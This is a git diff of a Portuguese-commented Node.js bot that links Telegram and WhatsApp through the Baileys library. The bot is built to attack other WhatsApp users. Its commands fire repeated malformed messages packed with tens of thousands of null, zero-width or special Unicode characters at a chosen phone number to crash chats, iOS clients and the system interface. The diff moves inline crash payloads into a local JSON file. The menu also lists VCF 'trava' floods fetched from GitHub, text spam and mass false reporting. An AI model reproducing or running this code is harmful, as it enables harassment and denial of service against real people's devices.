@@ -1,12 +1,12 @@
 const TelegramBot = require('node-telegram-bot-api');
-const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, downloadMediaMessage } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const http = require('http');
 
-// Servidor HTTP básico exigido pelo Render para manter o serviço ativo 24h
+// Servidor HTTP para manter ativo 24h (Render)
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -22,26 +22,7 @@ let waSock = null;
 let jaNotificouConectado = false;
 let reconectando = false;
 
-const dadosUsuarios = {}; 
-const configuracoesGrupos = {}; 
-const sessoesBrincadeira = {}; 
-
-const META_AI_JID = '718584497008509@s.whatsapp.net';
-
-function consultarAPI(url) {
-    return new Promise((resolve) => {
-        const req = https.get(url, (res) => {
-            let data = '';
-            res.on('data', (chunk) => data += chunk);
-            res.on('end', () => {
-                try { resolve(JSON.parse(data)); } catch (e) { resolve({ resultado: data }); }
-            });
-        });
-        req.on('error', () => resolve({ erro: "Falha na conexão." }));
-        req.setTimeout(8000, () => { req.destroy(); resolve({ erro: "Timeout." }); });
-    });
-}
-
+// Função para baixar o VCF de contatos do GitHub
 function baixarVCFGitHub() {
     return new Promise((resolve) => {
         const urlRaw = 'https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/Trava.vcf';
@@ -53,120 +34,50 @@ function baixarVCFGitHub() {
     });
 }
 
-// ==================== MÉTODOS DE TRAVAS E CRASH JSON (LOTUX) ====================
+// Função para ler as travas do arquivo JSON local ou padrão
+function carregarPayloadsJSON() {
+    const caminhoJson = path.join(__dirname, 'travas.json');
+    if (fs.existsSync(caminhoJson)) {
+        try {
+            return JSON.parse(fs.readFileSync(caminhoJson, 'utf-8'));
+        } catch (e) {
+            console.error("Erro ao ler o travas.json:", e);
+        }
+    }
+    return null;
+}
+
+// ==================== DISPARADORES DE TRAVAS JSON ====================
 
 async function enviarTravaCrashChat(sock, jidAlvo) {
-    const payloadJson = {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        hasMediaAttachment: true,
-                        bloksWidget: {
-                            data: "\u200d".repeat(60000),
-                            fallback: "\u200d".repeat(60000)
-                        },
-                        locationMessage: {
-                            degreesLatitude: 0,
-                            degreesLongitude: 0,
-                            name: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ",
-                            address: "LOTUX SYSTEM"
-                        }
-                    },
-                    body: { text: "⚡ [ZERYX-CRASH-CHAT] - LOTUX 💥" },
-                    nativeFlowMessage: {
-                        buttons: [
-                            {
-                                name: "cta_copy",
-                                buttonParamsJson: JSON.stringify({
-                                    display_text: "⚡ Click to Crash Zeryx ⚡",
-                                    copy_code: "\u0000".repeat(500000)
-                                })
-                            }
-                        ],
-                        messageVersion: 3
-                    }
-                }
-            }
-        }
+    const payloads = carregarPayloadsJSON();
+    let payloadJson = payloads?.crashChat || {
+        viewOnceMessage: { message: { interactiveMessage: { body: { text: "\u0000".repeat(30000) } } } }
     };
+    // Aplica repetição pesada dinamicamente para o Baileys
     await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
 }
 
 async function enviarTravaIOS(sock, jidAlvo) {
-    const payloadJson = {
-        viewOnceMessage: {
-            message: {
-                buttonsMessage: {
-                    locationMessage: {
-                        degreesLatitude: 0,
-                        degreesLongitude: 0,
-                        name: "𑇂𑆵𑆴".repeat(3000)
-                    },
-                    buttons: [
-                        {
-                            buttonId: "lotux_uwu",
-                            buttonText: { displayText: "𑇂𑆵𑆴".repeat(500) },
-                            type: "RESPONSE"
-                        }
-                    ],
-                    headerType: "LOCATION"
-                }
-            }
-        }
-    };
+    const payloads = carregarPayloadsJSON();
+    let payloadJson = payloads?.crashIOS || {};
+    // Ajusta repetição forte para iOS
+    if (payloadJson.viewOnceMessage?.message?.buttonsMessage) {
+        payloadJson.viewOnceMessage.message.buttonsMessage.locationMessage.name = "𑇂𑆵𑆴".repeat(4000);
+    }
     await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
 }
 
 async function enviarTravaCrashUI(sock, jidAlvo) {
-    const payloadJson = {
-        interactiveMessage: {
-            body: {
-                text: "\u00a9".repeat(100000)
-            },
-            nativeFlowMessage: {
-                messageParamsJson: ""
-            },
-            bloksWidget: {
-                uuid: "",
-                data: "",
-                type: "",
-                fallback: "</> Zeryx.js - LOTUX 🪐"
-            },
-            contextInfo: {
-                nonJidMentions: 9999
-            }
-        }
-    };
+    const payloads = carregarPayloadsJSON();
+    let payloadJson = payloads?.crashUI || {};
+    if (payloadJson.interactiveMessage?.body) {
+        payloadJson.interactiveMessage.body.text = "\u0000".repeat(40000);
+    }
     await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
 }
 
-async function enviarTravaLagHome(sock, jidAlvo) {
-    const payloadJson = {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    body: { text: "⚡ LOTUX DELAY METHOD ⚡" },
-                    footer: { text: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ" },
-                    carouselMessage: {
-                        cards: Array(100).fill({
-                            header: {
-                                title: "\nㅤㅤ\n",
-                                hasMediaAttachment: false
-                            },
-                            body: { text: "LAG SYSTEM ACTIVE" },
-                            nativeFlowMessage: {
-                                buttons: [{ name: "cta_url", buttonParamsJson: "{\"display_text\":\"LOTUX\",\"url\":\"https://t.me\"}" }]
-                            }
-                        }),
-                        messageVersion: 1
-                    }
-                }
-            }
-        }
-    };
-    await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
-}
+// ==================== CONEXÃO WHATSAPP ====================
 
 async function iniciarWhatsApp(chatId, numeroTelefone) {
     if (reconectando) return;
@@ -185,7 +96,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
     waSock.ev.on('creds.update', saveCreds);
 
     waSock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect } = update;
+        const { connection } = update;
         if (connection === 'close') {
             jaNotificouConectado = false;
             setTimeout(() => { reconectando = false; iniciarWhatsApp(chatId, numeroTelefone); }, 5000);
@@ -207,9 +118,8 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             const texto = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';
 
             if (!texto) return;
-            console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
 
-            // MENU COM IMAGEM CORRIGIDA E FORMATO NATIVE FLOW
+            // MENU COM FOTO DO GITHUB
             if (texto.trim() === '/menu') {
                 const numeroUsuario = remoteJid.split('@')[0];
                 const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
@@ -221,10 +131,9 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                              `🕒 *Horário:* ${dataHoraAtual}\n` +
                              `⭐ *Status:* PREMIUM ACTIVE\n\n` +
                              `┏━━━⧼🔥 COMANDOS DISPONÍVEIS ⧽\n` +
-                             `> \`/crasher <núm> <qtd>\` - Crash Chat\n` +
+                             `> \`/crasher <núm> <qtd>\` - Crash Chat JSON\n` +
                              `> \`/ioscrash <núm> <qtd>\` - Crash iOS\n` +
                              `> \`/crashui <núm> <qtd>\` - Crash System UI\n` +
-                             `> \`/laghome <núm> <qtd>\` - Lag Home / Delay\n` +
                              `> \`/5p4n <núm>\` - 1000 Travas VCF\n` +
                              `> \`/SP4M <núm> <qtd>\` - Spam de Texto\n` +
                              `> \`/B4N <núm> <qtd>\` - Denúncias Nativas\n` +
@@ -239,7 +148,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             else if (texto.startsWith('/crasher ')) {
                 const partes = texto.replace('/crasher', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
-                const quantidade = parseInt(partes[1]) || 5;
+                const quantidade = parseInt(partes[1]) || 3;
 
                 if (!alvoNum) {
                     await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/crasher <número> <quantidade>`' });
@@ -252,7 +161,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 for (let i = 1; i <= quantidade; i++) {
                     try {
                         await enviarTravaCrashChat(waSock, jidAlvo);
-                        await delay(800);
+                        await delay(1000);
                     } catch (err) {}
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash Chat concluído!` });
@@ -261,7 +170,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             else if (texto.startsWith('/ioscrash ')) {
                 const partes = texto.replace('/ioscrash', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
-                const quantidade = parseInt(partes[1]) || 5;
+                const quantidade = parseInt(partes[1]) || 3;
 
                 if (!alvoNum) {
                     await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/ioscrash <número> <quantidade>`' });
@@ -274,7 +183,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 for (let i = 1; i <= quantidade; i++) {
                     try {
                         await enviarTravaIOS(waSock, jidAlvo);
-                        await delay(800);
+                        await delay(1000);
                     } catch (err) {}
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash iOS concluído!` });
@@ -283,7 +192,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             else if (texto.startsWith('/crashui ')) {
                 const partes = texto.replace('/crashui', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
-                const quantidade = parseInt(partes[1]) || 5;
+                const quantidade = parseInt(partes[1]) || 3;
 
                 if (!alvoNum) {
                     await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/crashui <número> <quantidade>`' });
@@ -296,32 +205,10 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 for (let i = 1; i <= quantidade; i++) {
                     try {
                         await enviarTravaCrashUI(waSock, jidAlvo);
-                        await delay(800);
-                    } catch (err) {}
-                }
-                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash UI concluído!` });
-            }
-            // COMANDO /laghome
-            else if (texto.startsWith('/laghome ')) {
-                const partes = texto.replace('/laghome', '').trim().split(' ');
-                const alvoNum = partes[0]?.replace(/\D/g, '');
-                const quantidade = parseInt(partes[1]) || 3;
-
-                if (!alvoNum) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/laghome <número> <quantidade>`' });
-                    return;
-                }
-
-                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🌀 Disparando Lag Home / Delay para \`${alvoNum}\` (${quantidade}x)...` });
-
-                for (let i = 1; i <= quantidade; i++) {
-                    try {
-                        await enviarTravaLagHome(waSock, jidAlvo);
                         await delay(1000);
                     } catch (err) {}
                 }
-                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Lag Home concluído!` });
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash UI concluído!` });
             }
             // COMANDO /5p4n (1000 VCF DO GITHUB)
             else if (texto.startsWith('/5p4n ')) {
